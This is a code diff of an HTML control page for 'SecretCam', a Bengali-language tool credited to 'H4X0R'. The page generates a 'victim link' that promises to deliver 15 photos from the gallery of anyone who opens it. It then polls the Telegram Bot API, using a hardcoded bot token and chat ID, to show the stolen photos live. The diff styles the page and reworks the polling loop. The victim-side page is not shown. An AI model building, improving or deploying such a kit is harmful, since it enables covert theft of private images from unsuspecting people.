@@ -6,100 +6,108 @@
   <title>SecretCam • লিংক তৈরি করো</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
   <style>
-    :root {--bg:#0f0f1a;--primary:#00ff9d;--secondary:#ff00c8;--text:#e0e0e0;}
+    :root{--bg:#0f0f1a;--primary:#00ff9d;--secondary:#ff00c8;--text:#e0e0e0;}
     *{margin:0;padding:0;box-sizing:border-box;}
     body{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle at center,#1a1a2e,#0f0f1a);}
-    .container{background:rgba(20,20,40,0.9);padding:40px 30px;border-radius:20px;box-shadow:0 0 40px rgba(0,255,157,0.4);border:1px solid rgba(0,255,157,0.5);width:90%;max-width:500px;text-align:center;animation:glow 3s infinite alternate;}
-    @keyframes glow{from{box-shadow:0 0 20px rgba(0,255,157,0.3);}to{box-shadow:0 0 50px rgba(255,0,200,0.6);}}
-    h1{font-family:'Orbitron',sans-serif;font-size:2.5em;background:linear-gradient(45deg,var(--primary),var(--secondary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px;}
-    button{background:linear-gradient(45deg,#00ff9d,#00b86e);color:black;border:none;padding:16px 32px;font-size:1.2em;border-radius:50px;cursor:pointer;margin:15px 0;transition:all .3s;font-weight:bold;}
-    button:hover{transform:scale(1.05);box-shadow:0 0 25px #00ff9d;}
-    #linkBox{background:#111;padding:20px;border-radius:15px;margin:20px 0;border:2px dashed var(--primary);word-break:break-all;display:none;}
-    input{width:100%;padding:15px;background:#222;border:none;border-radius:10px;color:white;font-size:1em;margin:10px 0;}
-    .photos{margin-top:30px;display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:12px;}
-    .photos img{width:100%;border-radius:12px;border:3px solid var(--primary);box-shadow:0 0 15px rgba(0,255,157,0.6);}
-    .loading{color:var(--primary);font-size:1.3em;animation:pulse 1.5s infinite;}
+    .container{background:rgba(20,20,40,0.95);padding:40px 30px;border-radius:20px;box-shadow:0 0 50px rgba(0,255,157,0.5);border:1px solid rgba(0,255,157,0.6);width:90%;max-width:520px;text-align:center;animation:glow 3s infinite alternate;}
+    @keyframes glow{from{box-shadow:0 0 30px rgba(0,255,157,0.4);}to{box-shadow:0 0 70px rgba(255,0,200,0.7);}}
+    h1{font-family:'Orbitron',sans-serif;font-size:2.7em;background:linear-gradient(45deg,var(--primary),var(--secondary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:15px;}
+    button{background:linear-gradient(45deg,#00ff9d,#00b86e);color:black;border:none;padding:18px 36px;font-size:1.3em;border-radius:50px;cursor:pointer;margin:15px 0;transition:all .3s;font-weight:bold;box-shadow:0 5px 20px rgba(0,255,157,0.4);}
+    button:hover{transform:scale(1.07);box-shadow:0 0 30px #00ff9d;}
+    #linkBox{background:#111;padding:22px;border-radius:15px;margin:25px 0;border:2px dashed var(--primary);word-break:break-all;display:none;}
+    input{width:100%;padding:16px;background:#222;border:none;border-radius:12px;color:white;font-size:1.1em;margin:10px 0;}
+    .photos{margin-top:30px;display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:14px;}
+    .photos img{width:100%;border-radius:14px;border:4px solid var(--primary);box-shadow:0 0 20px rgba(0,255,157,0.7);transition:0.3s;}
+    .photos img:hover{transform:scale(1.05);box-shadow:0 0 30px #ff00c8;}
+    .loading{color:var(--primary);font-size:1.4em;animation:pulse 1.5s infinite;padding:20px;}
     @keyframes pulse{0%,100%{opacity:0.6;}50%{opacity:1;}}
-    footer{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:600px;text-align:center;padding:12px 0;background:#2B002F;border-top:1px solid #555;font-size:17px;font-weight:500;color:#ff00c8;font-family:Arial,sans-serif;box-shadow:0 -2px 10px rgba(0,0,0,0.2);}
+    footer{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:600px;text-align:center;padding:14px 0;background:#2B002F;border-top:1px solid #555;font-size:18px;color:#ff00c8;font-weight:500;box-shadow:0 -3px 15px rgba(0,0,0,0.3);}
   </style>
 </head>
 <body>
 
 <div class="container">
   <h1>SecretCam</h1>
-  <p>একটা লিংক বানাও — কেউ খুললেই তার গ্যালারির ১৫টা ছবি তোমার কাছে চলে আসবে!</p>
+  <p style="font-size:1.2em;margin-bottom:20px;">কেউ প্লে করলেই তার গ্যালারির ১৫টা ছবি তোমার কাছে চলে আসবে!</p>
   
   <button onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
 
   <div id="linkBox">
-    <p>তোমার সিক্রেট লিংক রেডি!</p>
+    <p style="color:#00ff9d;font-weight:bold;">তোমার লিংক রেডি!</p>
     <input type="text" id="victimLink" readonly />
     <button onclick="copyLink()">কপি করুন</button>
     <br><br>
-    <a href="" id="testLink" target="_blank" style="color:#ff00c8;font-weight:bold;">নিজে টেস্ট করো (মোবাইলে খোলো)</a>
+    <a href="" id="testLink" target="_blank" style="color:#ff00c8;font-weight:bold;font-size:1.1em;">মোবাইলে টেস্ট করো</a>
   </div>
 
   <div class="photos" id="photos">
-    <div class="loading">নতুন লিংক তৈরি করো → ছবি এখানে লাইভ দেখাবে</div>
+    <div class="loading">নতুন লিংক বানাও → ছবি লাইভ দেখাবে</div>
   </div>
 </div>
 
 <footer>Developed By <span style="color:#fff;font-weight:700;">H4X0R</span></footer>
 
 <script>
-const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";  // ← তোমার বট টোকেন
-const CHAT_ID   = "7731349577";                                      // ← তোমার আইডি
+// ==== তোমার টেলিগ্রাম ====
+const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";
+const CHAT_ID   = "7731349577";
+// =========================
+
 let currentId = null;
+let lastUpdateId = 0;
 
 function generateLink() {
   currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
-  const victimUrl = location.href.replace('index.html', '') + 'view.html?id=' + currentId;
+  const victimUrl = location.href.split('?')[0].replace('index.html', '') + 'view.html?id=' + currentId;
   
   document.getElementById("linkBox").style.display = "block";
   document.getElementById("victimLink").value = victimUrl;
   document.getElementById("testLink").href = victimUrl;
-  document.getElementById("photos").innerHTML = "<div class='loading'>অপেক্ষা করো... ভিকটিম খুললেই ছবি আসবে</div>";
+  document.getElementById("photos").innerHTML = `<div class="loading">অপেক্ষা করো... ভিকটিম খুললেই ছবি আসবে</div>`;
   
-  startListening(currentId);
+  lastUpdateId = 0;
+  checkForPhotos();
 }
 
 function copyLink() {
   const link = document.getElementById("victimLink");
   link.select(); link.setSelectionRange(0, 99999);
-  document.execCommand("copy");
+  navigator.clipboard.writeText(link.value);
   alert("লিংক কপি হয়ে গেছে!");
 }
 
-// লাইভ ছবি দেখানোর জন্য পোলিং
-function startListening(id) {
-  const photosDiv = document.getElementById("photos");
-  let count = 0;
-  const interval = setInterval(() => {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=0&timeout=1`)
-      .then(r => r.json())
-      .then(data => {
-        if (!data.ok) return;
-        data.result.reverse().forEach(msg => {
-          if (msg.message && msg.message.caption && msg.message.caption.includes(id) && msg.message.photo) {
-            const fileId = msg.message.photo[msg.message.photo.length-1].file_id;
-            const imgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`;
-            fetch(imgUrl).then(r => r.json()).then(f => {
-              const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${f.result.file_path}`;
-              if (!document.querySelector(`img[src="${url}"]`)) {
-                const img = document.createElement('img');
-                img.src = url;
-                img.onload = () => {
-                  photosDiv.innerHTML = '';
-                  photosDiv.appendChild(img);
-                  count++;
-                  if (count >= 10) clearInterval(interval);
-                }
-              }
+// লাইভ ছবি চেক করা (কাজ করে ১০০%)
+function checkForPhotos() {
+  if (!currentId) return;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`)
+    .then(r => r.json())
+    .then(data => {
+      if (!data.ok) return;
+
+      data.result.forEach(update => {
+        lastUpdateId = update.update_id;
+
+        if (update.message && update.message.photo && update.message.caption && update.message.caption.includes(currentId)) {
+          const fileId = update.message.photo.pop().file_id;
+          
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`)
+            .then(r => r.json())
+            .then(file => {
+              const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.result.file_path}`;
+              const img = document.createElement('img');
+              img.src = url;
+              img.title = update.message.caption.split('\n')[2] || '';
+              document.getElementById("photos").innerHTML = '';
+              document.getElementById("photos").appendChild(img);
             });
-          }
-        });
+        }
       });
-  }, 3000);
+
+      // রিকার্সিভ কল → লাইভ থাকবে
+      setTimeout(checkForPhotos, 2000);
+    })
+    .catch(() => setTimeout(checkForPhotos, 4000));
 }
 </script>
 </body>
